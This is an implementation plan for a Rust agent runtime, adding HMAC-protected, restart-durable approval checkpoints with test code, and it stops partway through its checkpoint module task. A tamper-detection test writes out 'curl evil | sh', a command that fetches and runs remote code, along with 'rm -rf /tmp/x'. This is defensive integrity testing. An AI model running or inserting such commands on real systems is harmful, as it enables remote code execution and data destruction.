# Durable HITL Slice 4B-1 — Durability Core Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A run parked on an approval survives frontend disconnect and daemon
restart — parent and child loops — and resumes in place when a frontend
attaches and answers, with child approvals attributed to their sub-agent.

**Architecture:** One new `agent-core/src/checkpoint.rs` owns the versioned
checkpoint format, HMAC integrity, and the `Checkpointer` runtime handle. The
loop parks by writing a checkpoint at the moment a gate `Ask` blocks (and
only then — E1); the answer deletes the park. Dispatch derives per-child
checkpointers (`children/<call_id>/`) and rebinds parked children on resume.
`agent-server` re-emits parked asks on attach and drives tree resume via a
freshly assembled loop against the descriptor's workspace + current config.

**Tech Stack:** Rust (agent/ workspace: agent-model, agent-policy, agent-core,
agent-runtime-config, agent-server), serde/serde_json, sha2 (HMAC-SHA256
built on it), tokio; React/TS + vitest (web/); WebDriver live drive.

**Spec:** `docs/superpowers/specs/2026-07-10-durable-hitl-design.md` §0
(Slice 4B-1), §2.2–§2.6, §3, §4, §6. All `file:line` anchors are orientation
only — **locate quoted code by content before editing** (repo convention).

## Plan-level refinements (recorded for the plan review + owner)

The spec's mechanisms are honored; these are implementation-level decisions
the spec left open or sketched illustratively:

1. **Child checkpoint dirs are keyed by the parent's dispatch call id**
   (`children/<sanitized call_id>/`), not `sub{n}` — dispatch ordinals are a
   process-wide counter and NOT restart-stable; call ids live in the parked
   batch and are. (`subagent_path` entries use the same call-id keys.)
2. **The checkpoint stores `origin` + the parsed batch, not a full
   `ApprovalRequest`** — display/summary are re-derived from stored args on
   resume anyway (spec §2.4 step 4 forbids showing persisted display), so
   serializing `ToolIntent`/`Display` would persist bytes we must never use.
3. **Restart-path answer commit = a MAC'd `answer.json` write** in the parked
   loop's checkpoint dir; `parked.json` deletion moves to consume-time inside
   the resumed loop. The live path keeps the spec's rule exactly (answered
   loop deletes the park before proceeding). Crash between answer and consume
   ⇒ next attach auto-resumes without re-prompting (park + answer both
   present). `answer.json` carries its own HMAC (keyed from the same secret,
   bound to the park's manifest MAC) so a same-host attacker without the
   secret cannot forge an approval — preserving E6b's forged-grant closure.
   Consume points (folded from plan review blocker 1): gate-kind-with-answer
   clears at the decision-consume arm; dispatch-kind clears at resumed-batch
   entry (execution imminent — a crash after either point loses the run per
   D1, never replays it); gate-kind-without-answer keeps its park until the
   live re-ask rewrites it. A FAILED resume retains whatever parks were not
   yet consumed (spec §4) and surfaces the error on the attached frontend;
   only a successfully completed run removes the checkpoint tree.
4. **Ancestor (dispatch-kind) checkpoints:** when a child parks, each
   ancestor flushes a pre-Phase-2 **memory** snapshot to disk (taken only for
   dispatch-bearing turns when a checkpointer is wired — memory-only, so E1's
   zero-I/O-on-non-Ask-path invariant holds). On resume the parent re-enters
   Phase 2 and re-executes its batch; dispatch calls rebind to child
   checkpoints, **non-dispatch siblings re-execute**. ⚠ OWNER DECISION P1
   (plan review finding 7): a non-dispatch sibling that COMPLETED before the
   daemon died (e.g. `execute_command` writing files) replays its host side
   effects on resume — exactly the replay class cited when E1 cut turn.json.
   This is outside the spec's stated model (§3.7's "Phase 2 hadn't started"
   holds only for the parked loop, not its ancestors).
   **Recorded decision (owner, 2026-07-10): SYNTHETIC LOST-RESULT.** On a
   dispatch-kind resume, only `dispatch_agent` calls re-execute (rebinding
   to child checkpoints); every other `Ready` sibling yields a synthetic
   `ToolStatus::Error` result — `"ERROR: result lost across daemon restart
   — re-run this call if it is still needed"` — so host side effects never
   replay and the model retries what it still cares about (Task 8).
5. **`run_id` is omitted from the checkpoint** — no run-identity concept
   exists at baseline; `session_id` + `subagent_path` identify a park.
6. **Tally clamp's "implied" floor** = count of `Role::Tool` messages after
   the last `Role::User` message in restored history (the executed calls of
   the current run's earlier turns); a stored tally below that ⇒ corrupt ⇒
   refuse (spec §2.4 step 3).
7. ⚠ **OWNER DECISION P2 — dispatch deadline vs. parked child (plan review
   finding 3):** E5 makes an unanswered Ask park indefinitely, but a child's
   ask stays bounded by the parent's `subagent_timeout` (default 600s). A
   frontend gone >10 min with the daemon alive ⇒ the dispatch timeout fires,
   the child future is dropped mid-await, and the run proceeds with a
   timeout result — "survives frontend disconnect… parent **and child**"
   fails on the live path (and the parent's turn-end then clears its park
   while the child's park is orphaned).
   **Recorded decision (owner, 2026-07-10): DISARM WHILE PARKED.** The
   dispatch deadline covers work, not waiting-for-approval: while any
   descendant of a dispatch call is blocked at a durable Ask, the deadline
   does not kill the child; it re-arms fresh when the ask is answered
   (consistent with the spec's fresh-deadline-on-resume ruling). Mechanism:
   an ask-in-progress counter on `Checkpointer` propagated up the parent
   chain (Tasks 5/7/9). Live-only asks (no checkpointer) keep today's
   deadline. Independent of the ruling, `IpcApprovalChannel::request` is
   drop-safe (Task 10) — a dropped await must not leak pending entries.
8. **Parked index is rebuilt on every attach**, not once at daemon startup
   (spec D4 wording) — functionally equivalent for 4B-1 (nothing consumes
   the index between attaches); recorded so 4B-2's `parked_runs` frame
   builds on the same scan instead of a second startup index.

## Global Constraints

- **E1 / spec §3.1:** runs that never hit `Ask` perform **zero checkpoint
  I/O**; with no checkpointer wired the loop is byte-identical to today.
  Non-Ask paths may pay at most a memory clone of the batch on
  checkpointer-wired tool turns (plus the context-state clone on
  dispatch-bearing ones) — memory, never I/O.
- **E2:** checkpoints never carry standing approvals; `ApproveAlways`
  answered before a restart is not remembered — a resumed run re-asks.
- All checkpoint dirs `0o700`, files `0o600` **including atomic-rename temp
  files**; temp names append the FULL filename (`parked.json.tmp`) — 4A-1
  collision gotcha.
- Refuse-on-corrupt: MAC failure, version mismatch, or partial tree ⇒ refuse
  to resume and surface honestly; never silently start fresh, never guess.
- Artifacts dump/restore is **Backend-trait-level** via recursive `ls` +
  `read` — never `glob` (capped at 500).
- **Additive wire protocol:** no frame removed/reshaped; new fields are
  `Option` + `skip_serializing_if`.
- Config is live truth, conversation is checkpointed truth (spec §3.3):
  resume re-derives policy/floors/skills/system prompt from **current**
  config against the descriptor's workspace.
- Trace JSONL contract unchanged (spec §3.6).
- Two Cargo workspaces: all `cargo` commands run in `agent/`. Web commands
  run in `web/`.
- Conventional commits `type(scope): summary`. Full `bash scripts/ci.sh`
  green before merge.

---

### Task 0: Branch

**Files:** none (git only)

- [ ] **Step 1: Branch off main**

```bash
cd /home/kalen/rust-agent-runtime
git checkout main && git checkout -b feature/durable-hitl-4b1
```

- [ ] **Step 2: Verify clean base**

Run: `git status --short` — Expected: empty output.

---

### Task 1: serde + `PartialEq` derives on `Message` and `ToolCall`

**Files:**
- Modify: `agent/crates/agent-model/src/types.rs`,
  `agent/crates/agent-tools/src/types.rs` (`ToolCall` gains `PartialEq`)
- Test: inline tests in `types.rs`

**Interfaces:**
- Produces: `Message: Serialize + Deserialize + PartialEq`,
  `ToolCall: PartialEq` (Tasks 3–4 derive `PartialEq` on structs embedding
  both — plan review finding 4; `Role`/`ToolCall` already have serde).

- [ ] **Step 1: Write the failing test**

In `types.rs`'s test module (create `#[cfg(test)] mod tests` if absent):

```rust
    #[test]
    fn message_serde_round_trips_all_fields() {
        let mut m = Message::assistant(
            "text".to_string(),
            Some(vec![agent_tools::ToolCall {
                id: "c1".into(),
                name: "t".into(),
                args: serde_json::json!({"k": 1}),
            }]),
        );
        m.reasoning = Some("thought".into());
        let json = serde_json::to_string(&m).unwrap();
        let back: Message = serde_json::from_str(&json).unwrap();
        assert_eq!(back.role, m.role);
        assert_eq!(back.content, m.content);
        assert_eq!(back.reasoning, m.reasoning);
        assert_eq!(back.tool_calls.as_ref().unwrap()[0].id, "c1");
        // Lenient decode: absent optionals default (forward compat).
        let sparse: Message =
            serde_json::from_str(r#"{"role":"user","content":"hi"}"#).unwrap();
        assert_eq!(sparse.content, "hi");
        assert!(sparse.tool_calls.is_none());
    }
```

(Adapt field construction to the real `Message` fields — `role`, `content`,
`tool_calls: Option<Vec<ToolCall>>`, `tool_call_id`, `name`, `reasoning` —
locate by content. If a constructor like `Message::assistant` doesn't set a
field, set it directly; all fields are `pub`.)

- [ ] **Step 2: Run test to verify it fails**

Run: `cd agent && cargo test -p agent-model message_serde`
Expected: COMPILE ERROR — `Serialize` not implemented for `Message`.

- [ ] **Step 3: Implement**

On `Message` (locate `#[derive(Debug, Clone)]` above `pub struct Message`):

```rust
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct Message {
```

and add `#[serde(default, skip_serializing_if = "Option::is_none")]` to each
`Option<...>` field (`tool_calls`, `tool_call_id`, `name`, `reasoning`) so
encodes stay compact and decodes stay lenient. In
`agent-tools/src/types.rs`, `ToolCall`'s derive gains `PartialEq` (its
`args: serde_json::Value` already implements it).

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-model`
Expected: PASS (all existing tests too).

- [ ] **Step 5: Commit**

```bash
git add agent/crates/agent-model/src/types.rs agent/crates/agent-tools/src/types.rs
git commit -m "feat(model): serde + PartialEq derives on Message/ToolCall (4B-1)"
```

---

### Task 2: `ApprovalOrigin` + origin field on `ApprovalRequest` (agent-policy)

**Files:**
- Modify: `agent/crates/agent-policy/src/engine.rs`,
  `agent/crates/agent-policy/src/lib.rs` (re-export),
  `agent/crates/agent-policy/Cargo.toml` (serde dep if absent)
- Test: inline tests in `engine.rs`

**Interfaces:**
- Produces (Tasks 3, 6, 8, 9, 11 rely on):

```rust
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct ApprovalOrigin {
    /// The dispatch call's on-wire id (`id_prefix + call_id`) — the 3B-2
    /// delegation id the subagent stream joins on.
    pub delegation_id: String,
    /// Registered sub-agent name, or "general-purpose".
    pub subagent_name: String,
    /// Dispatching tool's depth; top-level dispatch = 1.
    pub depth: usize,
}

pub struct ApprovalRequest {
    pub intent: ToolIntent,
    pub display: Option<Display>,
    pub origin: Option<ApprovalOrigin>,   // NEW — None for parent approvals
}

/// Wrap-at-dispatch decorator (spec §2.6): stamps origin onto every request
/// a child issues. The `sub{n}:` sink rewrite never touches approvals.
pub struct AttributingApprovalChannel {
    inner: std::sync::Arc<dyn ApprovalChannel>,
    origin: ApprovalOrigin,
}
impl AttributingApprovalChannel {
    pub fn new(inner: std::sync::Arc<dyn ApprovalChannel>, origin: ApprovalOrigin) -> Self;
}
// impl ApprovalChannel: sets req.origin = Some(self.origin.clone()), delegates.
```

- [ ] **Step 1: Write the failing test**

In `engine.rs` tests:

```rust
    #[tokio::test]
    async fn attributing_channel_stamps_origin() {
        use std::sync::{Arc, Mutex};
        struct Capture(Mutex<Option<ApprovalRequest>>);
        #[async_trait::async_trait]
        impl ApprovalChannel for Capture {
            async fn request(&self, req: ApprovalRequest) -> ApprovalResponse {
                *self.0.lock().unwrap() = Some(req);
                ApprovalResponse::Deny
            }
        }
        let cap = Arc::new(Capture(Mutex::new(None)));
        let ch = AttributingApprovalChannel::new(
            cap.clone(),
            ApprovalOrigin {
                delegation_id: "c7".into(),
                subagent_name: "explore".into(),
                depth: 1,
            },
        );
        let req = ApprovalRequest {
            intent: ToolIntent::read_only("ls"),
            display: None,
            origin: None,
        };
        ch.request(req).await;
        let seen = cap.0.lock().unwrap().take().unwrap();
        assert_eq!(seen.origin.unwrap().delegation_id, "c7");
    }
```

(`ToolIntent::read_only` — if no such constructor exists, build the intent
the way engine.rs's existing tests do; locate by content.)

- [ ] **Step 2: Run test to verify it fails**

Run: `cd agent && cargo test -p agent-policy attributing`
Expected: COMPILE ERROR — `ApprovalOrigin` / `origin` field not found.

- [ ] **Step 3: Implement**

Add `ApprovalOrigin` + the `origin` field + `AttributingApprovalChannel` as
specified in Interfaces:

```rust
#[async_trait]
impl ApprovalChannel for AttributingApprovalChannel {
    async fn request(&self, mut req: ApprovalRequest) -> ApprovalResponse {
        req.origin = Some(self.origin.clone());
        self.inner.request(req).await
    }
}
```

If agent-policy lacks a serde dep, add `serde = { workspace = true }` to its
`Cargo.toml`. Fix every `ApprovalRequest { .. }` construction site in the
workspace to add `origin: None` — find them:
`grep -rn "ApprovalRequest {" agent/crates --include=*.rs`
(verified sites: engine.rs tests, loop_.rs `gate_tool` + tests, and
agent-server's `sink.rs`, `approval.rs`, `wire.rs` test/impl constructions —
the commit below stages agent-server too). Re-export from `lib.rs` next to
`ApprovalRequest`:
`pub use engine::{ApprovalOrigin, AttributingApprovalChannel, ...};`

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-policy && cargo build --workspace`
Expected: PASS / clean build (all `origin: None` call sites fixed).

- [ ] **Step 5: Commit**

```bash
git add agent/crates/agent-policy agent/crates/agent-core agent/crates/agent-cli agent/crates/agent-server
git commit -m "feat(policy): ApprovalOrigin + attributing approval channel (4B-1, G4)"
```

---

### Task 3: `CuratedContextState` + restore seam on `CuratedContext`

**Files:**
- Modify: `agent/crates/agent-core/src/curated.rs`,
  `agent/crates/agent-core/src/context.rs` (trait default method),
  `agent/crates/agent-core/src/lib.rs` (re-export `CuratedContextState`)
- Test: inline tests in `curated.rs`

**Interfaces:**
- Consumes: Task 1 (`Message` serde).
- Produces (Tasks 5–8, 11 rely on):

```rust
/// The serializable pinned state of a CuratedContext (spec §2.2). NOT
/// persisted: system prompt (live truth, recomposed from current config),
/// memory index (re-loads via the 4A dirty-flag path), offload config /
/// high-water (live config), compact_flag + last_evicted (transient),
/// artifacts (dumped separately, §2.3).
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct CuratedContextState {
    pub goal: Option<Message>,
    pub history: Vec<Message>,
    pub compaction_summary: Option<Message>,
    pub folded_facts: Vec<String>,
    pub folded_sections: Vec<u64>,
    pub seq: u64,
    pub history_has_spans: bool,
    pub history_incomplete: bool,
    pub artifact_prefix: String,
    pub todos: Vec<crate::TodoItem>,
}

impl CuratedContext {
    pub fn checkpoint_state(&self) -> CuratedContextState;
    /// Restore constructor (net-new seam, spec §2.2). `todos` is the SHARED
    /// handle (same one `write_todos` gets); this fills it from `state`.
    pub fn restore(
        system: Message,
        artifacts: Arc<crate::SessionArtifacts>,
        compact_flag: Arc<AtomicBool>,
        todos: crate::TodoHandle,
        state: CuratedContextState,
    ) -> Self;
}

// context.rs — ContextManager gains a defaulted method (additive; the
// Middleware trait stays untouched per spec §2.2):
pub trait ContextManager: Send + Sync {
    // ...existing methods unchanged...
    /// Serializable pinned state for park-time checkpointing. Default None:
    /// implementations without durable state (WindowContext, test doubles)
    /// are unaffected and unparkable state simply isn't persisted.
    fn checkpoint_state(&self) -> Option<crate::CuratedContextState> {
        None
    }
}
```

- [ ] **Step 1: Write the failing test**

In `curated.rs` tests:

```rust
    #[test]
    fn checkpoint_state_round_trips_through_restore() {
        let artifacts = Arc::new(crate::SessionArtifacts::new());
        let flag = Arc::new(AtomicBool::new(false));
        let mut ctx = CuratedContext::new(
            Message::system("sys".into()),
            artifacts.clone(),
            flag.clone(),
        )
        .with_artifact_prefix("sub3-");
        ctx.set_goal("build the thing".into());
        ctx.append(Message::user("build the thing".into()));
        ctx.append(Message::assistant("ok".into(), None));
        ctx.compaction_summary = Some(Message::system("summary".into()));
        ctx.folded_facts.push("name = value".into());
        // private fields set via the state struct below instead where needed
        let todos: crate::TodoHandle = Arc::new(std::sync::Mutex::new(vec![
            crate::TodoItem { content: "step".into(), status: crate::TodoStatus::Pending },
        ]));
        let ctx = ctx.with_todos(todos);

        let mut state = ctx.checkpoint_state();
        assert_eq!(state.history.len(), 2);
        assert_eq!(state.artifact_prefix, "sub3-");
        assert_eq!(state.todos.len(), 1);
        state.seq = 7;
        state.folded_sections = vec![3];
        state.history_has_spans = true;

        // serde round-trip (what the checkpoint file does)
        let state: CuratedContextState =
            serde_json::from_str(&serde_json::to_string(&state).unwrap()).unwrap();

        let todos2: crate::TodoHandle = Arc::new(std::sync::Mutex::new(Vec::new()));
        let restored = CuratedContext::restore(
            Message::system("fresh-sys".into()),
            Arc::new(crate::SessionArtifacts::new()),
            Arc::new(AtomicBool::new(false)),
            todos2.clone(),
            state.clone(),
        );
        assert_eq!(restored.checkpoint_state(), state, "restore is lossless");
        // the SHARED handle was filled (write_todos sees the restored plan)
        assert_eq!(todos2.lock().unwrap().len(), 1);
        // system is LIVE truth — the restored context uses the fresh prompt
        assert_eq!(restored.system().unwrap().content, "fresh-sys");
    }

    #[test]
    fn context_manager_default_checkpoint_state_is_none() {
        let w = crate::WindowContext::new(Message::system("s".into()));
        assert!(crate::ContextManager::checkpoint_state(&w).is_none());
    }
```

(`compaction_summary`/`folded_facts` are `pub(crate)` — the test is in-crate.
`ctx.system()` is the `ContextManager` trait accessor; import the trait.)

- [ ] **Step 2: Run test to verify it fails**

Run: `cd agent && cargo test -p agent-core checkpoint_state`
Expected: COMPILE ERROR — `CuratedContextState` not found.

- [ ] **Step 3: Implement**

In `curated.rs`, add the struct (as in Interfaces) plus:

```rust
    /// Snapshot the pinned state for a park-time checkpoint (spec §2.2).
    pub fn checkpoint_state(&self) -> CuratedContextState {
        CuratedContextState {
            goal: self.goal.clone(),
            history: self.history.clone(),
            compaction_summary: self.compaction_summary.clone(),
            folded_facts: self.folded_facts.clone(),
            folded_sections: self.folded_sections.clone(),
            seq: self.seq,
            history_has_spans: self.history_has_spans,
            history_incomplete: self.history_incomplete,
            artifact_prefix: self.artifact_prefix.clone(),
            todos: self.todos.lock().unwrap().clone(),
        }
    }

    /// Rebuild from a checkpoint. System prompt, offload config, high-water,
    /// and memory index are NOT restored — they re-derive from live config
    /// (spec §3.3); callers apply `with_offload_config` etc. after this.
    pub fn restore(
        system: Message,
        artifacts: Arc<crate::SessionArtifacts>,
        compact_flag: Arc<std::sync::atomic::AtomicBool>,
        todos: crate::TodoHandle,
        state: CuratedContextState,
    ) -> Self {
        *todos.lock().unwrap() = state.todos;
        let mut ctx = Self::new(system, artifacts, compact_flag).with_todos(todos);
        ctx.goal = state.goal;
        ctx.history = state.history;
        ctx.compaction_summary = state.compaction_summary;
        ctx.folded_facts = state.folded_facts;
        ctx.folded_sections = state.folded_sections;
        ctx.seq = state.seq;
        ctx.history_has_spans = state.history_has_spans;
        ctx.history_incomplete = state.history_incomplete;
        ctx.artifact_prefix = state.artifact_prefix;
        ctx
    }
```

Override the trait method inside `impl ContextManager for CuratedContext`:

```rust
    fn checkpoint_state(&self) -> Option<crate::CuratedContextState> {
        Some(CuratedContext::checkpoint_state(self))
    }
```

Add the defaulted method to the `ContextManager` trait in `context.rs` (as in
Interfaces). Re-export in `lib.rs` next to `CuratedContext`:
`pub use curated::{CuratedContext, CuratedContextState, ...};`

Note: `goal`/`history`/`seq`/`artifact_prefix` etc. are private fields of the
SAME module — direct assignment compiles. `set_goal` is NOT used in restore
(it truncates to `GOAL_MAX_TOKENS` and takes a `String`; the checkpointed
goal `Message` is already the post-truncation pinned form).

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd agent && cargo test -p agent-core curated`
Expected: PASS, including all existing curated tests.

- [ ] **Step 5: Commit**

```bash
git add agent/crates/agent-core/src/curated.rs agent/crates/agent-core/src/context.rs agent/crates/agent-core/src/lib.rs
git commit -m "feat(core): CuratedContext checkpoint_state + restore seam (4B-1)"
```

---

### Task 4: `checkpoint.rs` — format, HMAC, atomic I/O, refuse-on-corrupt

**Files:**
- Create: `agent/crates/agent-core/src/checkpoint.rs`
- Modify: `agent/crates/agent-core/src/lib.rs` (**`pub mod checkpoint;`** —
  agent-server calls its free functions directly (finding 8) — plus
  re-export `pub use checkpoint::{Checkpoint, CheckpointError, Checkpointer, GateRecord, Guardrails, InvalidParked, ParkedTurn, CHECKPOINT_VERSION};`),
  `agent/crates/agent-core/Cargo.toml` (add `sha2 = "0.10"`)
- Test: inline `#[cfg(test)] mod tests` in `checkpoint.rs`

**Interfaces:**
- Consumes: Task 1 (`Message` serde), Task 2 (`ApprovalOrigin`), Task 3
  (`CuratedContextState`).
- Produces (Tasks 5–8, 10–11 rely on these exact shapes):

```rust
pub const CHECKPOINT_VERSION: u32 = 1;

/// Serializable outcome of gating one call (index-parallel to the batch).
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub enum GateRecord {
    /// Policy-allowed or human-approved; resume rebuilds the ReadyCall
    /// WITHOUT re-prompting (spec §3.7).
    Ready,
    /// Denied / unknown tool / intent error; `content` is the final
    /// `ERROR: …` tool-result text.
    Rejected { content: String },
}

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct InvalidParked { pub id: String, pub name: String, pub error: String }

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct ParkedTurn {
    /// The turn's model text (display/debug; the message itself is already
    /// the last assistant entry in `context.history`).
    pub assistant_text: String,
    /// The turn's full parsed valid batch, post id-normalization.
    pub tool_calls: Vec<agent_tools::ToolCall>,
    /// Unparseable calls (re-seeded as per-call ERROR results on resume).
    pub invalid: Vec<InvalidParked>,
    /// Decisions for calls BEFORE the parked index (len == parked_index for
    /// gate-kind; len == tool_calls.len() for dispatch-kind).
    pub gate_records: Vec<GateRecord>,
    /// Some(i) ⇒ gate-kind park (blocked at call i's Ask). None ⇒
    /// dispatch-kind ancestor snapshot (whole batch gated; re-enter Phase 2).
    pub parked_index: Option<usize>,
    pub origin: Option<agent_policy::ApprovalOrigin>,
}

#[derive(Debug, Clone, Copy, PartialEq, Default, serde::Serialize, serde::Deserialize)]
pub struct Guardrails { pub tool_calls: u64, pub model_calls: u64 }

#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub struct Checkpoint {
    pub version: u32,
    pub session_id: String,
    /// [] = parent loop; ["<call_id>", ...] = path of dispatch call ids.
    pub subagent_path: Vec<String>,
    /// 0-based turn index the park happened in (resume continues at turn+1
    /// after replaying this one).
    pub turn: u64,
    pub context: crate::CuratedContextState,
    pub guardrails: Guardrails,
    pub parked: ParkedTurn,
}

#[derive(Debug, thiserror::Error)]
pub enum CheckpointError {
    #[error("checkpoint io: {0}")] Io(#[from] std::io::Error),
    #[error("checkpoint corrupt: {0}")] Corrupt(String),
    #[error("checkpoint version {found} unsupported (expected {CHECKPOINT_VERSION})")]
    Version { found: u32 },
}

// Free functions (Checkpointer in Task 5 wraps them):
pub fn write_checkpoint(dir: &Path, key: &[u8; 32], chk: &Checkpoint,
    artifacts: &BTreeMap<String, BTreeMap<String, String>>) -> std::io::Result<()>;
pub fn load_checkpoint(dir: &Path, key: &[u8; 32]) -> Result<Option<Checkpoint>, CheckpointError>;
pub fn load_artifact_dump(dir: &Path) -> Result<BTreeMap<String, BTreeMap<String, String>>, CheckpointError>;
pub fn clear_park(dir: &Path);                       // parked.json+manifest+artifacts/ only
pub fn write_answer(dir: &Path, key: &[u8; 32], approve: bool) -> std::io::Result<()>;
pub fn take_answer(dir: &Path, key: &[u8; 32]) -> Option<bool>;  // verify+consume
pub fn has_park(dir: &Path) -> bool;                 // parked.json exists
```

**Layout per loop level** (spec §2.2 storage, child key refined per header
note 1):

```
<dir>/
  parked.json      # Checkpoint (serde_json)
  manifest.json    # { version, files: {relpath → sha256hex}, hmac: hex }
  answer.json      # { approve, mac } — restart-path answer commit (transient)
  artifacts/results/<name>.json  artifacts/history/<name>.json
  children/<call_id>/            # same layout, recursive
```

Artifact dump files: to avoid path-traversal on restore, each backend's tree
is stored as ONE json file per backend (`artifacts/results.json`,
`artifacts/history.json`), a `BTreeMap<String, String>` of virtual path →
content. (Backend-trait-level dumping still walks `ls`+`read`; only the
on-disk shape is a map file — no nested untrusted paths ever touch the host
filesystem.)

**Integrity:** `manifest.files` maps `"parked.json"`, `"artifacts/results.json"`,
`"artifacts/history.json"` to sha256 hex of their bytes;
`manifest.hmac = hex(hmac_sha256(key, serde_json::to_vec(&files)))` —
BTreeMap gives deterministic serialization. Verify = recompute both layers;
any mismatch/missing file ⇒ `Corrupt`. `answer.json.mac =
hex(hmac_sha256(key, [approve as u8] ++ manifest.hmac bytes))` — binds the
answer to the exact park it approves.

- [ ] **Step 1: Write the failing tests**

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;

    fn key() -> [u8; 32] { [7u8; 32] }

    fn sample() -> Checkpoint {
        Checkpoint {
            version: CHECKPOINT_VERSION,
            session_id: "100-aabbccdd".into(),
            subagent_path: vec![],
            turn: 2,
            context: crate::CuratedContextState {
                goal: None,
                history: vec![agent_model::Message::user("hi".into())],
                compaction_summary: None,
                folded_facts: vec![],
                folded_sections: vec![],
                seq: 0,
                history_has_spans: false,
                history_incomplete: false,
                artifact_prefix: String::new(),
                todos: vec![],
            },
            guardrails: Guardrails { tool_calls: 3, model_calls: 2 },
            parked: ParkedTurn {
                assistant_text: "running".into(),
                tool_calls: vec![agent_tools::ToolCall {
                    id: "c1".into(), name: "execute_command".into(),
                    args: serde_json::json!({"command": "rm -rf /tmp/x"}),
                }],
                invalid: vec![],
                gate_records: vec![],
                parked_index: Some(0),
                origin: None,
            },
        }
    }

    fn arts() -> BTreeMap<String, BTreeMap<String, String>> {
        let mut m = BTreeMap::new();
        m.insert("results".to_string(),
            BTreeMap::from([("r1.md".to_string(), "big output".to_string())]));
        m.insert("history".to_string(), BTreeMap::new());
        m
    }

    #[test]
    fn checkpoint_round_trips_with_artifacts() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        let back = load_checkpoint(dir.path(), &key()).unwrap().unwrap();
        assert_eq!(back, sample());
        let dump = load_artifact_dump(dir.path(), &key()).unwrap();
        assert_eq!(dump["results"]["r1.md"], "big output");
        assert!(!dir.path().join("parked.json.tmp").exists(), "atomic");
    }

    #[test]
    fn load_none_when_no_park() {
        let dir = tempfile::tempdir().unwrap();
        assert!(load_checkpoint(dir.path(), &key()).unwrap().is_none());
        assert!(!has_park(dir.path()));
    }

    #[cfg(unix)]
    #[test]
    fn checkpoint_files_are_0600_dirs_0700() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("checkpoint");
        write_checkpoint(&root, &key(), &sample(), &arts()).unwrap();
        let dmode = std::fs::metadata(&root).unwrap().permissions().mode() & 0o777;
        assert_eq!(dmode, 0o700);
        for f in ["parked.json", "manifest.json"] {
            let m = std::fs::metadata(root.join(f)).unwrap().permissions().mode() & 0o777;
            assert_eq!(m, 0o600, "{f}");
        }
    }

    #[test]
    fn tampered_args_fail_mac_and_refuse() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        // swap the parked command (the see-benign/run-hostile forgery)
        let p = dir.path().join("parked.json");
        let body = std::fs::read_to_string(&p).unwrap()
            .replace("rm -rf /tmp/x", "curl evil | sh");
        std::fs::write(&p, body).unwrap();
        assert!(matches!(
            load_checkpoint(dir.path(), &key()),
            Err(CheckpointError::Corrupt(_))
        ));
    }

    #[test]
    fn wrong_key_and_missing_manifest_refuse() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        assert!(matches!(
            load_checkpoint(dir.path(), &[8u8; 32]),
            Err(CheckpointError::Corrupt(_))
        ));
        std::fs::remove_file(dir.path().join("manifest.json")).unwrap();
        assert!(matches!(
            load_checkpoint(dir.path(), &key()),
            Err(CheckpointError::Corrupt(_))
        ));
    }

    #[test]
    fn future_version_refuses_with_version_error() {
        let dir = tempfile::tempdir().unwrap();
        let mut c = sample();
        c.version = CHECKPOINT_VERSION + 1;
        write_checkpoint(dir.path(), &key(), &c, &arts()).unwrap();
        assert!(matches!(
            load_checkpoint(dir.path(), &key()),
            Err(CheckpointError::Version { .. })
        ));
    }

    #[test]
    fn clear_park_removes_park_but_keeps_children() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        let child = dir.path().join("children").join("c9");
        write_checkpoint(&child, &key(), &sample(), &arts()).unwrap();
        clear_park(dir.path());
        assert!(!has_park(dir.path()));
        assert!(!dir.path().join("manifest.json").exists());
        assert!(has_park(&child), "children untouched");
    }

    #[test]
    fn answer_round_trips_consumes_and_rejects_forgery() {
        let dir = tempfile::tempdir().unwrap();
        write_checkpoint(dir.path(), &key(), &sample(), &arts()).unwrap();
        write_answer(dir.path(), &key(), true).unwrap();
        assert_eq!(take_answer(dir.path(), &key()), Some(true));
        assert_eq!(take_answer(dir.path(), &key()), None, "consumed");
        // forged (no key): hand-written approve must not verify
        std::fs::write(dir.path().join("answer.json"),
            r#"{"approve":true,"mac":"00"}"#).unwrap();
        assert_eq!(take_answer(dir.path(), &key()), None);
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd agent && cargo test -p agent-core checkpoint`
Expected: COMPILE ERROR — module/items not found. Add `mod checkpoint;` +
re-exports + the `sha2` dep first so failures are missing items only.

- [ ] **Step 3: Implement**

```rust
//! Park-point checkpoints (spec 2026-07-10 durable-HITL §2.2–§2.3, E1/E6b):
//! written ONLY when an Ask parks; HMAC-SHA256 manifest keyed from the
//! daemon-local secret; refuse-on-corrupt; delete-on-answer.
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

pub const CHECKPOINT_VERSION: u32 = 1;
```

then the types from Interfaces verbatim, then:

```rust
fn hmac_sha256(key: &[u8; 32], data: &[u8]) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    let mut ikey = [0x36u8; 64];
    let mut okey = [0x5cu8; 64];
    for (i, b) in key.iter().enumerate() {
        ikey[i] ^= b;
        okey[i] ^= b;
    }
    let inner = Sha256::new().chain_update(ikey).chain_update(data).finalize();
    Sha256::new().chain_update(okey).chain_update(inner).finalize().into()
}

